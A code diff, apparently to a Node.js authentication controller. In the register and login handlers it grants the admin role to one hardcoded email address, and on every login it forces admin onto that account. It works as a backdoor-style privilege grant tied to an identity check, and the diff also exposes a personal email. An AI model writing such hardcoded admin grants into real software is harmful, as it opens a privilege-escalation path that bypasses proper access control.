@@ -48,7 +48,7 @@ const register = async (req, res) => {
         email,
         displayName: displayName || email.split("@")[0],
         photoURL,
-        role: "user",
+        role: email === "nayem20talukdar@gmail.com" ? "admin" : "user",
       });
 
       await user.save();
@@ -99,7 +99,7 @@ const register = async (req, res) => {
       displayName,
       password: hashedPassword,
       photoURL,
-      role: "user",
+      role: email === "nayem20talukdar@gmail.com" ? "admin" : "user",
     });
 
     await user.save();
@@ -164,6 +164,12 @@ const login = async (req, res) => {
         success: false,
         message: "Invalid credentials",
       });
+    }
+
+    // Force admin role for specific email if not already set
+    if (user.email === "nayem20talukdar@gmail.com" && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
     }
 
     // Generate JWT token
